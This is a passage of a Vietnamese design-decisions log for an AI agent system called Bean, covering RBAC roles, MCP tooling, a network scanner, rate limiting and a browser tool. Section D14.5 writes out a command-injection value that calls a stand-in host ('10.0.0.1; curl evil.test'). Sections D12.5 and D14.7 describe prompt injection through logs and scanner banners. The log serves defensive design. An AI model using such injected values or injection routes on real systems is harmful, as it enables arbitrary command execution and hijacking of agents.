    tảng khác**. Trước khi thêm channel mới phải liệt kê bất biến và đối chiếu từng cái với đặc
    tính nền tảng đích, đặc biệt là phần *không có tín hiệu API tương đương*.

## 11. RBAC & project profile (D11.x — milestone M21)

* **D11.1 — `no-access` là deny-all (fail-closed), không phải "role không tag".**
  Spec M21 mâu thuẫn: mục 4 nói `required_tags() = &[]` ⇒ *"ai trong `allowed_users` cũng gọi
  được"*, nhưng test bắt buộc nói user không có trong `user_roles` *"không gọi được tool nào
  kể cả tool an toàn cũ"*. Chọn hướng **fail-closed** vì `Plan.md` mục 2 coi "role mặc định
  `no-access`" là **bất biến bắt buộc**. Cụ thể:
  * `no-access` thấy **không tool nào**, kể cả untagged.
  * `required_tags() = &[]` chỉ nghĩa *"không cần thẻ đặc biệt"* — với role **đã** được cấp quyền.
  * `no-access` là tên **dự phòng của hệ thống**: `validate()` **từ chối** nếu khai báo lại nó
    trong `[[roles]]`, tránh cấu hình tự mâu thuẫn.
  * Bằng chứng: `crates/bean-core/tests/rbac.rs::user_without_role_is_no_access_and_sees_no_tool`.

* **D11.2 — RBAC chỉ bật khi `agent.user_roles` khác rỗng.** Nếu bật vô điều kiện thì mọi cài
  đặt một-người-dùng sẵn có **đột nhiên mất hết tool** ngay sau khi nâng cấp. Vì vậy
  `Config::rbac_enabled()` = `!user_roles.is_empty()`; bảng `[[roles]]` vẫn được nạp để có sẵn
  tên tag. Bằng chứng: `rbac_disabled_keeps_legacy_behavior_for_every_allowed_user`.

* **D11.3 — Một kiểu `RolePermissions` tuần tự hoá được, quyết định đúng một chỗ.**
  `Plan.md` mục 4 ràng buộc (1) giao tiếp serializable và (3) RBAC check ở đúng một điểm.
  `RolePermissions` (`bean-types::rbac`) là hiện thân của cả hai: Router gọi
  `Config::permissions_for(user_id)` **một lần** mỗi run, rồi truyền struct xuống agent loop
  qua `RunTurnArgs::permissions`. Agent loop **không** tự tra cứu role.

* **D11.4 — Hai chốt chặn, cùng một ngữ nghĩa.** (a) `registry.specs_visible_to(perms)` lọc danh
  sách tool **trước** khi dựng request tới LLM (M21.5 yêu cầu rõ "không lọc sau khi model đã
  chọn tool"); (b) `registry.allows(name, perms)` chặn lúc thực thi. Cả hai gọi **cùng** một
  hàm `RolePermissions::allows` với **cùng** một struct ⇒ không thể lệch nhau. Chốt (b) là bắt
  buộc vì `args` là JSON không tin cậy: nội dung `<untrusted_content>` hoặc ảo giác của model
  vẫn có thể bịa tên tool. Đây **không** phải "logic RBAC thứ hai rải rác" — quyết định vẫn
  chỉ được ra ở Router một lần.

* **D11.5 — `required_tags` dùng ngữ nghĩa OR; `run_shell` mang `["dev-write", "infra-scan"]`.**
  Nếu chỉ gắn `dev-write` cho `run_shell` thì M23 (security-scan) không chạy được `nmap`/`trivy`;
  nếu gắn `infra-read` thì role chỉ-đọc cũng chạy được shell. OR với hai tag cho phép đúng hai
  vai trò cần nó, vẫn chặn `qa`.

* **D11.6 — `run_shell` **phải** bị chặn với `qa`, không chỉ `write_file`/`edit_file`.**
  Đây là điểm dễ sót nhất: nếu chỉ chặn tool ghi file thì `qa` chạy
  `echo x > src/lib.rs` là lách được four-eyes. Vì vậy cả 3 tool có khả năng sửa code
  (`write_file`, `edit_file`, `run_shell`) đều mang tag `dev-write`.

* **D11.7 — Four-eyes kiểm ở tầng code bằng `forbid_tags`, không dựa vào model.** `validate()`
  **từ chối khởi động** nếu một role vừa được cấp tag vừa khai báo tag đó trong `forbid_tags`.
  Bảng mẫu khai báo `qa.forbid_tags = ["dev-write"]` ⇒ không thể lỡ tay phá nguyên tắc.
  Bằng chứng: `config_rejects_role_that_is_granted_a_forbidden_tag`.

* **D11.8 — Ngân sách token tách theo role qua bảng `usage_by_role` (migration v5).**
  Bảng `usage` (tổng toàn instance) **giữ nguyên** vì `GET /api/status` đang dùng; thêm bảng
  mới `(day, role)` thay vì sửa bảng cũ để không phá dữ liệu người dùng. Mỗi lượt ghi vào
  **cả hai** sổ: tổng cho status, riêng role cho ngân sách. `context_budget_tokens` cũng lấy
  theo role. Bằng chứng: `store::tests::usage_by_role_is_independent_between_roles`.

* **D11.9 — Project profile = workspace riêng, `default` là dự phòng.** `default` ánh xạ tới
  `agent.workspace` và **không** khai báo lại trong `[[projects]]` (`validate()` từ chối). Mỗi
  project có `MEMORY.md`/`USER.md` riêng **và** sandbox `run_shell` riêng, nên lệnh trong project
  A không nhìn/ghi được file của project B — giữ nguyên tắc path jail mục 15.1. Tên project lạ
  bị `RouterError::InvalidProject` (fail-closed, không rơi về project khác). Bằng chứng:
  `two_projects_do_not_mix_memory_md`.

## 12. Monitor agent qua MCP (D12.x — milestone M22)

* **D12.1 — Tag RBAC khai báo ở cấp **server** (`[[mcp_servers]].tool_tags`), không gắn tay từng
  tool.** MCP protocol không tiết lộ tag của tool (`tools/list` chỉ có name/description/schema),
  nên không thể gắn tag chi tiết từng tool như built-in. Chọn gắn ở cấp server vì đó là ranh giới
  tin cậy thực sự: **toàn bộ** tool của một server SIEM/CVE đều là dữ liệu giám sát hạ tầng. Rủi ro
  của cách này là **thô** (một server có cả tool đọc lẫn tool ghi thì cả hai cùng tag) — chấp nhận
  được vì server không tin cậy đã phải bọc container (mục 16) và `trust = false` vẫn hỏi xác nhận.

* **D12.2 — `tool_tags` rỗng ⇒ giữ nguyên hành vi cũ.** Server không khai báo tag thì mọi role đã
  cấp quyền đều thấy, đúng như trước M21. Nhờ vậy thêm MCP server mới không vô tình khoá người
  dùng. Bằng chứng: `mcp_server_without_tags_keeps_legacy_visibility`.

* **D12.3 — `Tool::required_tags()` trả `Vec<&str>` sở hữu, không phải `&[&str]`.** Tag có thể đến
  từ **file cấu hình chạy được** (`[[mcp_servers]].tool_tags`) chứ không chỉ literal trong mã, nên
  không thể yêu cầu `&'static str` mà không rò bộ nhớ. Chi phí: một `Vec` nhỏ mỗi lần lọc; lọc
  tool chỉ xảy ra mỗi bước của vòng lặp nên không đáng kể.

* **D12.4 — M22 chỉ làm read-only, KHÔNG thêm tool quét chủ động.** Đúng như `Plan.md` yêu cầu.
  Việc quét trong `[[infra_scope]]` thuộc M23, kèm chốt chặn target ở tầng code và cảnh báo mức
  cao gửi thẳng cho admin. M22 **không** mở đường cho `nmap`/`trivy`.

* **D12.5 — Kết quả MCP tiếp tục bọc `<untrusted_content>` không đổi.** Đây là điểm quan trọng:
  dữ liệu log SIEM/CVE là nguồn injection kinh điển (attacker ghi được vào log). Test
  `monitor_tool_result_is_wrapped_and_cannot_escape_the_block` dùng payload cố cài thẻ đóng để
  chứng minh nó bị escape và khối bọc không bị phá.

## 13. Finance-readonly (D13.x — milestone M22a)

* **D13.1 — Đi hướng GENERIC thay vì chọn hẳn AWS/Azure/GCP.** `Plan.md` M22a ghi *"chọn theo nhà
  cung cấp cloud công ty đang dùng"* nhưng chưa chốt được nhà cung cấp. Hard-code một provider sẽ
  phải viết lại khi đổi, nên tool lấy `base_url` + credential từ cấu hình. Đổi provider chỉ cần
  sửa `bean.toml`, **không sửa/build lại binary** — đúng tinh thần kiến trúc A (một tiến
  trình, cấu hình quyết định hành vi).

* **D13.2 — Ràng buộc "credential phải riêng" kiểm ở TẦNG CODE, không chỉ bằng tài liệu.**
  `Config::validate_billing()` **từ chối khởi động** nếu `billing.api_key_env` trùng với
  `llm.api_key_env`, `tools.web_search.api_key_env` hay `telegram.token_env`. Lý do: yêu cầu M22a là
  *"credential đọc billing PHẢI là API key/IAM role riêng, quyền tối thiểu chỉ đọc billing"* — nếu
  chỉ ghi trong README thì một lần copy-paste config là đã vi phạm mà không ai bị chặn. Đây là
  mẫu chung: kiểm ràng buộc bảo mật ở chỗ load cấu hình, không dựa vào kỷ luật vận hành.

* **D13.3 — Chế độ STUB mặc định, không gọi mạng.** Chưa có `base_url` hoặc chưa có credential thì
  tool trả thông báo nói rõ *"chưa cấu hình, đây là kết quả dự kiến chứ không phải lỗi"*, đồng thời
  `description` của tool ghi *"HIỆN CHƯA CẤU HÌNH"*. Mục đích: người vận hành không bao giờ tưởng
  đã đọc được chi phí thật, và `make check`/môi trường dev chạy được ngay mà không cần secret.
  Khi bật billing mà thiếu key thì `resolve_billing_key()` báo lỗi rõ (không im lặng chạy stub).

* **D13.4 — Rủi ro tài chính chặn bằng RBAC tag, không bằng xác nhận thủ công.** Tool là `Safe`
  (chỉ đọc) nhưng mang tag `billing-read`, nên chỉ role `finance-readonly` thấy được. Cấu hình mẫu
  khai báo `finance-readonly.forbid_tags = ["infra-read", "infra-scan"]` để tầng code chặn lẫn
  domain (M22a yêu cầu 3), tái dùng đúng cơ chế `forbid_tags` đã có từ M21 thay vì thêm logic mới.

* **D13.5 — Tool trong crate riêng `bean-billing`.** Giữ đúng nguyên tắc "domain tách biệt"
  của M21–M24: billing không lẫn vào `bean-security` (đó là crate SSRF/sandbox) hay
  `bean-tools` (đó là trait/registry). Thêm source ở M22a rẻ hơn nhiều so với dồn về sau.

## 14. Security-scan (D14.x — 2026-09-26)

Chủ dự án đã **mở khóa M23** (S1 đã vá, `make check` xanh) và chọn `[[infra_scope]]` **rỗng**
(fail-closed) cho tới khi họ điền target thật. Công cụ mới: `crates/bean-scan`.

| # | Quyết định | Vì sao | Hệ quả đã chấp nhận |
|---|-----------|--------|---------------------|
| D14.1 | `infra_scope` **rỗng ⇒ từ chối mọi thứ** | Agent có quyền chạy lệnh. Không có allowlist thì chỉ cần một dòng log/ticket chứa "quét 8.8.8.8" là máy chủ người dùng thành công cụ tấn công do chính họ vận hành. Mặc định an toàn phải là "không quét được gì". | Mở tính năng phải khai trước scope, nếu không mọi lần quét chỉ trả về lời từ chối (có log cảnh báo lúc khởi động). |
| D14.2 | Scope **chỉ nhận `ip`/`cidr`, cấm `hostname`** | Code kiểm scope và scanner sẽ phân giải DNS ở **hai thời điểm khác nhau**: kẻ điều khiển DNS trả IP được phép lúc kiểm tra rồi đổi sang IP khác lúc scanner chạy (TOCTOU). | Chấp nhận phải nhập IP/CIDR thay vì tên dễ nhớ. |
| D14.3 | `[security_scan.sandbox]` **tách khỏi** `[security.sandbox]` | Scanner **bắt buộc** phải có mạng để tới target, còn `run_shell` phải `--network none`. Dùng chung một cấu hình sẽ vô hiệu hoá cách ly của `run_shell` — đổi `network=true` cho scanner là mất an toàn của mọi lệnh shell. | Hai khối cấu hình riêng; `validate()` từ chối `network = false`. |
| D14.4 | `mode = "host"` **bắt buộc** `allow_host = true` | Cùng lý do với `[security.sandbox]`: chạy scanner ngoài container là hạ cấp cách ly, phải là hành động tường minh chứ không phải mặc định. | Cấu hình `host` mà quên cờ sẽ **không khởi động**, thay vì chạy âm thầm. |
| D14.5 | Tool **không có tham số `command`**; code tự dựng argv, exec thẳng (không `sh -c`) | `Sandbox::run` nhận chuỗi rồi chạy `sh -c`, nên `; \| & $()` trong tham số có ý nghĩa với shell — model chỉ cần truyền `target = "10.0.0.1; curl evil.test"` là chạy lệnh tuỳ ý ngoài phạm vi. Thêm `Sandbox::run_argv` (exec thẳng) và đặt target sau `--`. | Scanner chỉ hỗ trợ dạng lệnh nmap cố định; muốn đổi scanner phải sửa `ScannerCmd`/cấu hình chứ không nhét lệnh từ model. |
| D14.6 | `security_scan` khai báo `Risk::Dangerous` | M23 yêu cầu "không có cho phép trong phiên". `Policy::decide` **đã** trả `allow_in_session: false` cho mức này, nên không cần (và không được) viết logic riêng — dùng lại đúng một đường quyết định. | Hai test khẳng định kể cả khi đã allow-in-session và khi đã đọc untrusted, tool vẫn hỏi. |
| D14.7 | Output scanner bọc `<untrusted_content>` | Banner mà scanner đọc được từ target do **kẻ tấn công kiểm soát** — đúng loại payload mà S1 (2026-09-26) đã vá cho `read_file`/`run_shell` (mục 22.5 áp cho MỌI tool có nguồn ngoài lõi). | Test khẳng định payload cài `</untrusted_content>` bị escape, khối chỉ còn **một** thẻ đóng. |
| D14.8 | Tự viết so khớp CIDR, **không** thêm crate `ipnet` | Vài chục dòng `std` đủ; thêm dependency vào công cụ bảo mật để tránh 20 dòng tự viết là đánh đổi xấu (mục 15.10 chuỗi cung ứng). | Phải tự bảo đảm IPv4/IPv6 không bao giờ "rơi" xuống khớp chéo — có test riêng. |

**Bằng chứng:** `crates/bean-scan/tests/scan.rs` (12 test) + `crates/bean-scan/src/scope.rs`
(6 unit test) + `crates/bean-types/tests/config.rs` (9 test M23). Test dùng sandbox chế
độ host với script tự tạo, nên **không cần Docker, không cần mạng, không cần image scanner**.

### D14.9 — Cảnh báo qua trait `AlertSink`, không tham chiếu `Router` (đóng K23)

M23 yêu cầu cảnh báo mức cao gửi **thẳng** cho chủ dự án, song song với báo cáo chuẩn hoá
gửi Manager. Ban đầu phần này mới chỉ có schema báo cáo + cấu hình, **chưa có đường gọi thật** —
một khoảng trống dễ khiến người dùng tin là đã có cảnh báo Telegram khi thực ra chưa (K23).

| # | Quyết định | Vì sao |
|---|-----------|--------|
| D14.9 | Trait `AlertSink` đặt ở `bean-tools` (cùng `ToolCtx`), **không** đặt ở `bean-core` | `bean-scan` cần gửi cảnh báo, mà `bean-core` lại điều phối tool. Nếu tham chiếu thẳng `Router` sẽ thành phụ thuộc vòng. M23 chỉ cần một trait một hàm, không cần cả Router. |
| D14.10 | `RouterAlertSink` bọc quanh `Router::notify` | Giữ **một** đường gửi duy nhất ⇒ lỗi gửi rơi vào outbox và được thử lại, không mất tin cảnh báo an ninh (không tạo đường gửi "song song" riêng). |
| D14.11 | Chỉ mức `High` mới gửi cảnh báo trực tiếp; `Low`/`Medium` chỉ nằm trong báo cáo | `Plan.md` M23 nói *"cảnh báo mức cao"*. Gửi mọi lần quét sẽ biến kênh chính thành spam và dạy bạn bỏ qua nó. Quy tắc nằm ở `AlertSeverity::needs_direct_alert()` — một chỗ duy nhất. |
| D14.12 | Lỗi gửi cảnh báo chỉ ghi log, **không** làm hỏng tool | Mục 6: lỗi tool không được làm hỏng vòng lặp. Kênh chính hỏng không phải lý do để bỏ dở lần quét. |

**Bằng chứng:** `crates/bean-core/tests/router.rs` — `security_scan_high_alert_reaches_the_main_channel`
gọi tool `security_scan` **thật** (script in `22/tcp open ssh`) rồi khẳng định cảnh báo tới
đúng channel, có `message_id` thật trong DB; `failed_alert_goes_to_outbox_instead_of_being_lost`;
`alert_sink_is_none_when_not_configured`. Cộng 4 test ở `crates/bean-scan/tests/scan.rs`
cho ranh giới mức nghiêm trọng và việc lỗi gửi không làm hỏng tool.

## 15. Marketing (D15.x — 2026-09-26)

| # | Quyết định | Vì sao | Hệ quả đã chấp nhận |
|---|-----------|--------|---------------------|
| D15.1 | Tách domain làm ở phía **role** (`allowed_tool_tags`), không phải gắn tag vào tool | `Plan.md` M24 đòi role `marketing` thấy `web_fetch` mà **không** thấy `write_file`/`run_shell`. Gắn `required_tags` vào `web_fetch` sẽ *giấu nó khỏi mọi role khác* — hồi qui cho cài đặt đang chạy. Danh sách trắng ở role giải quyết cả hai: marketing bị giới hạn, các role cũ không đổi gì. | Thêm một khái niệm RBAC. Bù lại, `allowed_tool_tags` rỗng = đúng hành vi M21. |
| D15.2 | Thêm `Tool::also_visible_to` (mặc định rỗng) | `allowed_tool_tags` một mình sẽ ẩn luôn `web_fetch` khỏi marketing. Method này *mở thêm* một lối cho tool untagged mà vốn bị ẩn, và rỗng ở **mọi** tool nên không đổi hành vi cấu hình cũ. | Tool untagged phải khai `also_visible_to` mới hiện với role giới hạn. |
| D15.3 | Credential publish phải **riêng**, kiểm ở `validate_marketing` | Quyền API "chỉ post" không được dùng lại key có quyền rộng hơn. Chỉ ghi trong README thì một lần copy-paste config là đã vi phạm mà không ai chặn. | Trùng với LLM/search/Telegram ⇒ **không khởi động** được. |
| D15.4 | `marketing_publish` khai `Risk::Dangerous` **cứng trong code** | `Plan.md` M24: "BẮT BUỘC luôn Dangerous — không cho phép trong phiên dù cấu hình nói gì, kiểm tra cứng ở code". Đăng bài là hành động **không hoàn tác**. | `Policy::decide` trả `allow_in_session: false` ⇒ không có tuỳ chọn đó, kể cả khi đã duyệt trước đó. |
| D15.5 | `marketing_draft` = `Confirm`, **không** có đường gọi mạng | Ghi file trong workspace đã jail thì đọc/xoá được, nên không cần `Dangerous`. Quan trọng hơn: tool này **không tồn tại** đường HTTP nào — bảo đảm ở tầng code chứ không phải lời hứa trong `description`. | Mọi việc lên xuống mạng nằm sau `marketing_publish` + một bước xác nhận. |
| D15.6 | `SafeHttpClient::post_bearer` thêm mới, **không** tái dùng đường nào khác | `fetch` chỉ có GET. Thêm hàm riêng thay vì mở rộng `fetch` để không làm nongỏ chỗ kiểm SSRF cho request có body. | Mọi kiểm tra của `fetch_bearer` (validate URL, resolver, redirect từng bước, giới hạn body) được nhân bản nguyên vẹn. |
| D15.7 | `marketing.enabled` mà thiếu biến credential ⇒ **lỗi lúc khởi động**, không phải stub | Khác hẳn M22a (billing) vốn cho stub im lặng: đăng bài không hoàn tác được, nên "tưởng đã cấu hình" là nguy hiểm. | Thiếu biến là thấy ngay, không phải lúc chạy. |

**Bằng chứng:** `crates/bean-marketing/tests/marketing.rs` (13 test) — đủ ba yêu cầu kiểm thử
bắt buộc của M24: marketing không thấy/gọi được tool ngoài tag, `marketing_publish` luôn
Confirm kể cả sau allow-in-session, `marketing_draft` không có network call.

## 16. Bean làm MCP server read-only (D16.x — 2026-09-27, milestone M25)

| # | Quyết định | Vì sao | Hệ quả đã chấp nhận |
|---|-----------|--------|---------------------|
| D16.1 | Cổng expose **cứng** `MCP_EXPOSED_TAGS` + `Risk::Safe`, kiểm **trước** RBAC | `RolePermissions::allows` trả `true` cho *mọi* tool khi role giữ tag `*`. Nếu chỉ dựa vào RBAC thì client MCP gắn role `admin` sẽ thấy và gọi được `write_file`/`run_shell`/`security_scan` — vi phạm phạm vi cứng của M25 (*"kể cả nếu client tự xưng có quyền cao"*). | Cổng này **thắt trên** RBAC chứ không thay thế nó: tool phải qua cả hai. Tool `Confirm` cũng bị loại vì client MCP không có ai bấm nút xác nhận. |
| D16.2 | Cổng nằm ở `bean-core`, `Router::call_tool_as` gọi lại **cùng** `Config::permissions_for` + `RolePermissions::allows` | `Plan.md` mục 4.3 cấm rải logic RBAC. Đường MCP không đi qua `Router::submit` (đó là vòng lặp agent có LLM) nên cần một điểm gọi thứ hai — nhưng nó **áp dụng** kết quả quyết định, không viết lại. | Handler `ServerHandler` không tự so sánh tag; test chứng minh cả hai lớp không thể lệch. |
| D16.3 | Token lưu **hash SHA-256** trong bảng `mcp_clients`, **không** đặt trong `bean.toml` | `Plan.md` M25 nói "lưu hash". Nhưng cấu hình thường được commit còn `data.dir` thì không — đặt hash ở config là rò bí mật vào git. | `[[mcp_clients]]` chỉ là **chính sách** (ai → role nào); credential nằm trong `data.dir/bean.db`, thu hồi bằng `auth mcp-token revoke`. |
| D16.4 | Xác thực **trước khi tạo handler**, không phải trong `initialize` | Yêu cầu M25 là "từ chối ở bước handshake". Kiểm sớm hơn một bước còn tốt hơn: client không biết Bean tồn tại, không thấy tool nào, không gửi được tham số nào xuống tầng dưới. | stdio thiếu/sai token ⇒ tiến trình thoát trước khi đọc stdin; HTTP ⇒ `401` trước khi chạm `StreamableHttpService`. |
| D16.5 | Tham số được làm sạch trong `Router::call_tool_as`, **không** ở handler | `call_tool_as` là ranh giới duy nhất đi vào tool từ phía ngoài; đặt ở handler thì một caller mới sau này có thể quên. | Lớp làm sạch không thể bị bỏ sót, và test gọi thẳng `call_tool_as` vẫn được bảo vệ. |
| D16.6 | `memory_query` mang tag riêng `memory-read`, không dùng lại nhóm `memory` | M25 đòi expose "đúng ba tag". Tool untagged sẽ bị mọi role thấy, và tag tường minh giúp người đọc cấu hình hiểu ngay đường MCP đọc được gì. | Thêm một hằng tag; role muốn đọc ghi chú qua MCP phải được cấp `memory-read` một cách tường minh. |
| D16.7 | `validate_mcp_server` chặn ở tầng cấu hình: thiếu identity, lệch role, role `admin`, HTTP bind ngoài loopback, bật mà không có client | Cùng nguyên tắc `forbid_tags` của M21.6: cấu hình sai phải chết lúc nạp chứ không "phát hiện khi client không thấy tool nào". | Người dùng không thể vô tình cấp `no-access` cho client hay lộ cổng MCP ra ngoài. |
| D16.8 | Mỗi client có **service HTTP riêng** được cache lại, không dựng mới mỗi request | `StreamableHttpService` giữ `LocalSessionManager` bên trong. Dựng mỗi request ⇒ session tạo ở `initialize` biến mất ngay và client không gọi được `tools/call`. Đồng thời cô lập session của client này khỏi client khác. | Bộ nhớ đệm theo `mcp-client:<name>`; mỗi client giữ đúng một tập session riêng. |
| D16.9 | Log của toàn hệ thống ghi ra **stderr** | Ở `mcp serve` (stdio) thì stdout **chính là** kênh JSON-RPC; một dòng log trộn vào đó khiến client không đọc được phản hồi nào. | Đây là lỗi thật do smoke test mới bắt được, không phải lý thuyết. |

**Bằng chứng:** `crates/bean-core/tests/mcp_server.rs` (12 test) — đủ bốn yêu cầu kiểm thử
bắt buộc của M25: token không hợp lệ bị từ chối trước handshake, `finance-readonly` chỉ
thấy tool `billing-read`, gọi thẳng `dev_write` bị **từ chối** ở tầng thực thi, tham số
chứa chuỗi giống SQL/FTS injection bị làm sạch; cộng `admin_wildcard_cannot_reach_write_tools_through_mcp`
cho thấy tag `*` không vượt được cổng. Smoke test thật (stdio + streamable-HTTP) đã xác minh
`initialize` → `tools/list` → `tools/call` với session thật.

## 16b. Vá K24 — giới hạn tần suất + nhật ký riêng cho MCP server (D16.10–D16.13, 2026-09-27)

| # | Quyết định | Vì sao | Hệ quả đã chấp nhận |
|---|-----------|--------|---------------------|
| D16.10 | `mcp.jsonl` ghi **song song** với `audit.jsonl`, **không thay thế** | Đây là lựa chọn được hỏi rõ ràng và chủ dự án chốt **song song**. Lý do kỹ thuật khiến nó ít rủi ro hơn: `GET /api/audit` và trang Audit trong UI đọc `audit.jsonl` qua `AuditLog::read_recent`, và các bản ghi `channel = mcp-client:*` **đang** hiển thị ở đó. Thay thế hoàn toàn ⇒ xoá lịch sử khỏi nơi người dùng thật sự đọc, không ai hỏi, và phải sửa cả REST lẫn UI. | Mỗi sự kiện MCP nằm ở hai file. Đổi lại: `tail -f data.dir/audit/mcp.jsonl` là nguồn **duy nhất** về MCP để phát hiện lạm dụng, không phải lọc giữa kênh. Nếu sau này muốn bỏ bản ghi chung thì đổi ở `BeanMcpHandler::audit_event` — một chỗ. |
| D16.11 | Rút thuật toán của `POST /api/auth/login` ra `bean_security::ratelimit::RateLimiter` cho **cả hai** dùng chung | K24 yêu cầu "không viết thuật toán giới hạn tần suất mới". Toàn bộ toán học (cửa sổ 60s, khoá tăng dần `1<<min(n-5,8)`, trần 300s) nằm ở đúng một chỗ; `AuthService` chỉ đổi chỗ gọi. | Login **không** đổi hành vi — test `logout_and_rate_limit_are_server_side` (5 lần sai ⇒ 401, lần 6 ⇒ 429) vẫn xanh nguyên trạng. Đổi ngưỡng login về sau tự động áp cho MCP. |
| D16.12 | `ServeContext` có hai cửa **bất đối xứng**: `authenticate_stdio` vs `authenticate_http` | Yêu cầu "áp rate-limit CHỈ cho HTTP" dễ bị vi phạm vô tình về sau. Làm nó **không thể** vi phạm bằng chữ ký hàm: `authenticate_stdio` không có tham số limiter nào để truyền, nên không ai gọi nhầm được. | Một cặp hàm phải giữ đồng bộ khi sửa. Đổi lại: stdio **không thể** bị khoá nhầm, kể cả do ai đó thêm limiter vào hàm cũ. |
| D16.13 | Kiểm tra giới hạn **trước**, tra DB **sau**; khoá theo `hash_token`; trần cấu hình được, `http_enabled` + `0` thì validate chặn | `authenticate` băm token rồi tra `mcp_clients`; tra trước thì kẻ dò token bắn được hàng loạt truy vấn SQLite. Token thô là bí mật dài hạn — làm khoá `HashMap` sẽ giữ nó sống trong bộ nhớ tiến trình (và core dump). Còn việc cho phép `0` là để người dùng tự chịu trách nhiệm, nhưng **phải nói ra**: `http_enabled = true` mà `0` thì chết lúc nạp cấu hình. | IP lấy từ `ConnectInfo` (socket), **không** đọc `X-Forwarded-For` — header do client chọn, tin vào nó là để kẻ tấn công tự chọn khoá nào bị khoá. Phải gọi `into_make_service_with_connect_info` nếu không sẽ mọi request rơi về cùng một khoá loopback. |

**Ngưỡng đã chốt (chủ dự án duyệt 2026-09-27):**

| Lớp | Khoá | Ngưỡng | Chặn cái gì |
|---|---|---|---|
| chống dò token | token **và** IP | 5 lần/60s, khoá tăng dần tới 300s | brute-force token |
| trần lưu lượng | token | 120 req/phút (`rate_limit_per_minute`) | token lô bị dùng để quét dữ liệu |
| trần lưu lượng | IP | ×5 = 600 req/phút (`rate_limit_ip_multiplier`) | một IP điều khiển nhiều token |

120 req/phút ≈ 2 request/giây — rộng hơn nhiều so với một agent gọi tool, nên **không**
vỡ phiên coding dài; nhưng vẫn chặn được việc quét hàng loạt. IP nhân 5 vì nhiều client hợp
lệ có thể đi chung một IP (reverse proxy, NAT, nhiều IDE trên một máy).

**Bằng chứng:** `crates/bean-core/tests/mcp_server.rs` — 4 test bắt buộc của K24:
`http_transport_locks_out_after_repeated_token_failures` (5 lần sai ⇒ 401, lần 6 ⇒
`RateLimited`), `valid_token_below_the_limit_keeps_working` (100 request hợp lệ liên tiếp
dưới ngưỡng đều qua — hồi quy chống rate-limit nhầm), `valid_token_above_the_volume_limit_is_limited`
(lớp thứ hai: token **đã xác thực** cũng bị chặn khi vượt lưu lượng),
`stdio_transport_is_never_rate_limited` (sau khi chứng minh limiter HTTP **đang** khoá,
1000 lần `authenticate_stdio` vẫn qua — chứng minh hai transport không dùng chung bộ đếm).
Cộng `mcp_request_is_written_to_the_dedicated_log` (client + tool + thời điểm RFC3339 trong
`mcp.jsonl`, **và** `audit.jsonl` vẫn giữ bản ghi — bằng chứng cho D16.10),
`audit_open_named_rejects_paths_outside_the_audit_dir`. Thêm
`crates/bean-security/src/ratelimit.rs` (6 unit test, gồm trần bộ nhớ) và
`crates/bean-types/tests/config.rs` (2 test cho ngưỡng + validate).

## 17. Tool browser nội bộ — nói thẳng CDP (D26.x — 2026-09-28)

Thay chrome-devtools-mcp (npm/MCP) bằng crate Rust `chromiumoxide` trong crate mới
`crates/bean-browser`. Không phụ thuộc Node ở bất kỳ đâu.

| # | Quyết định | Vì sao | Hệ quả đã chấp nhận |
|---|-----------|--------|---------------------|
| D26.1 | Thêm `ToolOutput` + `Tool::call_rich` (có default impl) thay vì đổi chữ ký `call` | Đổi `call` thành `Result<ToolOutput, _>` sẽ chạm 25+ tool built-in, `TypedTool`, wrapper MCP, mọi adapter kênh và hàng chục test — trong khi nhu cầu thật chỉ có **một** tool trả ảnh. Default impl gọi lại `call` nên **tool cũ không đổi một dòng nào** và agent loop gọi `call_rich` mà không cần biết tool nào trả ảnh. | Thêm một biến thể hàm trong trait. Đổi lại: phạm vi thay đổi thu hẹp còn **một impl** (`ScreenshotTool`), và `ToolOutput` là kiểu mở rộng được cho tương lai. |
| D26.2 | `chromiumoxide = "=0.9.1"` + `default-features = false` | CDP type được **sinh tự động** từ `protocol.json`; một bản minor mới có thể đổi shape của type nên `0.9` khiến build không tái lập được. Tắt `default-features` loại `chromiumoxide_fetcher` khỏi dependency graph — nguyên tắc "cài trước, không tải lúc chạy" được bảo đảm ở **tầng build**, không phải lời hứa lúc chạy. | Người dùng phải **tự cài** Chrome/Chromium. Test `chrome_fetcher_is_absent_from_the_dependency_graph` + `chromiumoxide_version_is_pinned_exactly` chốt hồi quy. Nâng phiên bản là việc có chủ đích, có kiểm thử. |
| D26.3 | Lớp kiểm tra URL **riêng** cho domain browser, không sửa `bean_security::ssrf` | `web_fetch` dùng resolver DNS tuỳ biến lọc IP ngay lúc kết nối (chống DNS rebinding đúng) và cố ý chặn loopback. Thêm "ngoại lệ cho browser" vào `ssrf` sẽ làm hỏng bảo đảm đó của **mọi** request `web_fetch`. | Hai bộ quy tắc phải giữ đồng bộ khi sửa. Đổi lại: `ssrf` của hệ thống không bao giờ nới lỏng. Khoảng hở DNS rebinding còn lại ghi ở `known-issues.md` K23. |
| D26.4 | Ảnh có **định phí token cố định** (`IMAGE_BUDGET_TOKENS`), không dùng `chars/4` | Công thức `chars/4` ước lượng **văn bản**. Base64 không phải văn bản: ảnh PNG 200 KB thành ~270.000 ký tự ⇒ `chars/4` cho ~67.500 token, gấp hơn 40 lần chi phí thật, và một lần chụp sẽ tự loại hết lịch sử của lượt đó. | Ảnh luôn tốn 1.600 token bất kể kích thước. Hệ quả có chủ đích: ảnh **rẻ hơn** văn bản cùng dung lượng nên `trim_history` loại ảnh cũ trước khi loại lời thoại. |
| D26.5 | Audit chỉ ghi **tham chiếu** `image:<mime>:<sha256>:<len>`, không ghi base64 | Ghi payload ảnh (hàng trăm KB/call) làm phình `audit.jsonl` vô hạn theo thời gian, và audit log hay bị copy đi lưu. SHA-256 của byte ảnh đủ để đối chiếu với `Message.image` trong SQLite mà không nhân bản payload. | Muốn xem ảnh thì đọc SQLite (giữ nguyên định dạng `Message` cho provider). `AuditEntry::artifact` cũng đi qua `redact_text_secrets` như `error`. |
| D26.6 | Không gọi `no_sandbox()` cho Chrome | Sandbox renderer của Chromium là lớp phòng thủ chính chống exploit-render-escape. Tắt nó cho "chạy được trong container" là đánh đổi sai: mất lớp phòng thủ để đổi lấy tiện lợi. | Chạy trong container thiếu kernel phù hợp thì Chrome không khởi động ⇒ lỗi rõ ràng, **không** tự tắt sandbox. Cần thì chạy trên host với profile cô lập. |
